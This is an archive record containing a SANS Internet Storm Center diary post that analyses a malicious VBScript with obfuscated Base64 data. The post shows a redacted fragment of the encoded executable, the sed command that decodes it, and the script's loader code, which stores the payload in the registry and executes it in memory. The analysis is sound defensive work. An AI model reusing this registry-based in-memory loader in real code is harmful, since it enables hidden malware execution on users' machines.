{
    "id": "cb5c8c6b-259b-486a-a910-d53501de8827",
    "created_at": "2023-01-12T14:58:59.265479Z",
    "updated_at": "2025-03-27T02:05:32.526211Z",
    "deleted_at": null,
    "sha1_hash": "9ed4118330474277b7998e56cdac568e928005e9",
    "title": "2017-07-08 - A VBScript with Obfuscated Base64 Data",
    "authors": "",
    "file_creation_date": "2022-05-28T15:57:25Z",
    "file_modification_date": "2022-05-28T15:57:25Z",
    "file_size": 991807,
    "plain_text": "# SANS ISC: InfoSec Handlers Diary Blog - SANS Internet Storm Center SANS Site Network Current Site SANS Internet Storm Center Other SANS Sites Help Graduate Degree Programs Security Training Security Certification Security Awareness Training Penetration Testing Industrial Control Systems Cyber Defense Foundations DFIR Software Security Government OnSite Training InfoSec Handlers Diary Blog\n\n**isc.sans.edu/diary/rss/22590**\n\n## A VBScript with Obfuscated Base64 Data\n\n**Published: 2017-07-08**\n\n**Last Updated: 2017-07-08 05:56:42 UTC**\n\n**by** [Xavier Mertens (Version: 1)](https://isc.sans.edu/handler_list.html#xavier-mertens)\n\n[0 comment(s)](https://isc.sans.edu/forums/diary/A+VBScript+with+Obfuscated+Base64+Data/22590/#comments)\nA few months ago, I posted a diary to explain how to search for (malicious) PE files in\n[Base64 data[1]. Base64 is indeed a common way to distribute binary content in an ASCII](https://isc.sans.edu/forums/diary/Searching+for+Base64encoded+PE+Files/22199)\nform. There are plenty of scripts based on this technique. On my Macbook, I'm using a small\nservice created via Automator to automatically decode highlighted Base64 data and submit\nthem to my Viper instance for further analysis:\n\n[But yesterday, I found, on pastebin.com[2], a malicious WScript file with a Base64 string that](https://pastebin.com/EhG9ZQtH)\ndid not decode. The script ended with an error \"Invalid character in input stream”. I had a\nquick look at the script and found indeed unexpected characters randomly spread in the\nBase64 data:\n\n\n-----\n\n```\nH TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAA\ngBTM~*hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ~*KJAAAAAAAAABQRQAATAEDAG\nOAAAgELAQsAALIAAAAIAAAAAAAAjtEAAAAgAAAA4AAAAABAAAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAAAgAQA\nUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAADTRAABXAAAAAOAAAPgEAAAAAAAAAAAAAAAAAAAAAAAA\nAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAA\nAC5~*ZXh~*AAAAlLEAAAAgAAAAsgAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAPgEAAAA4AAAAAYAAAC~\nAAAABAAABAL...(redacted)\n\n```\nIf you check in the VBScript code, you'll indeed see an instruction to replace those\nunexpected characters from the Base64 string:\n```\n$_b=$_b.replace('~*','0’);\n\n```\nWhen just replace the string by ‘0’ as stated in the script, you get back the malicious PE file:\n```\n$ sed \"s/\\~\\*/0/g\" base64.txt | base64 -d >base64.exe\n$ file base64.exe\nfoo.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows\n$ md5sum base64.exe\n07be65dedbee0ef5582f0eff5dd4d804 base64.exe\n\n```\n[The file is, of course, malicious as reported by VT[3].](https://www.virustotal.com/en/file/0e6694d37b2a424402a41bbd520bec4bc416813fa744013ba1b3eab27378a291/analysis/)\n\nFinally, a quick remark about the script itself: it uses the Windows registry to store the\npayload and execute it:\n```\nO.regwrite D,H,\"REG_SZ\"\nO.Run C & chrw(34) & \"$_b = (get-itemproperty -path 'HKCU:\\SOFTWARE\\Microsoft\\' -name\n'KeyName').KeyName;\n$_b=$_b.replace('~*','0');\n[byte[]]$_0 = [System.Convert]::FromBase64String($_b);\n$_1 = [System.Threading.Thread]::GetDomain().Load($_0);\n$_1.EntryPoint.invoke($null,$null);\" & Chrw(34),0,false\n\n```\nNothing fancy here but attackers are always using small tricks to prevent (or better \" to slow\ndown\") the automated analysis by security tools. Search always for functions/tools that do\nsearch/replace operations in the analyzed code. It can help to save your time. Happy\nhunting!\n\n[1] [https://isc.sans.edu/forums/diary/Searching+for+Base64encoded+PE+Files/22199](https://isc.sans.edu/forums/diary/Searching+for+Base64encoded+PE+Files/22199)\n\n[2] [https://pastebin.com/EhG9ZQtH](https://pastebin.com/EhG9ZQtH)\n\n[3]\nhttps://www.virustotal.com/en/file/0e6694d37b2a424402a41bbd520bec4bc416813fa744013b\na1b3eab27378a291/analysis/\n\n\n-----\n\nXavier Mertens (@xme)\nISC Handler - Freelance Security Consultant\n[PGP Key](https://pgp.mit.edu/pks/lookup?op=get&search=0x881F7C8E873FCB38)\n\n[Keywords: Automation](https://isc.sans.edu/tag.html?tag=Automation) [Base64](https://isc.sans.edu/tag.html?tag=Base64) [Obfuscation](https://isc.sans.edu/tag.html?tag=Obfuscation) [VBScript](https://isc.sans.edu/tag.html?tag=VBScript)\n[0 comment(s)](https://isc.sans.edu/forums/diary/A+VBScript+with+Obfuscated+Base64+Data/22590/)\n\nJoin us at SANS! Attend Reverse-Engineering Malware: Malware Analysis Tools and\nTechniques with Xavier Mertens in Amsterdam starting Aug 15 2022\n\nTop of page\n×\n\n[Diary Archives](https://isc.sans.edu/diaryarchive.html)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-07-08 - A VBScript with Obfuscated Base64 Data.pdf"
    ],
    "report_names": [
        "2017-07-08 - A VBScript with Obfuscated Base64 Data.pdf"
    ],
    "threat_actors": [
        {
            "id": "a3687241-9876-477b-aa13-a7c368ffda58",
            "created_at": "2022-10-25T16:07:24.496902Z",
            "updated_at": "2025-03-27T02:02:10.256629Z",
            "deleted_at": null,
            "main_name": "Hacking Team",
            "aliases": [],
            "source_name": "ETDA:Hacking Team",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e90c06e4-e3e0-4f46-a3b5-17b84b31da62",
            "created_at": "2023-01-06T13:46:39.018236Z",
            "updated_at": "2025-03-27T02:00:02.978356Z",
            "deleted_at": null,
            "main_name": "Hacking Team",
            "aliases": [],
            "source_name": "MISPGALAXY:Hacking Team",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535539,
    "ts_updated_at": 1743041132,
    "ts_creation_date": 1653753445,
    "ts_modification_date": 1653753445,
    "files": {
        "pdf": "https://archive.orkl.eu/9ed4118330474277b7998e56cdac568e928005e9.pdf",
        "text": "https://archive.orkl.eu/9ed4118330474277b7998e56cdac568e928005e9.txt",
        "img": "https://archive.orkl.eu/9ed4118330474277b7998e56cdac568e928005e9.jpg"
    }
}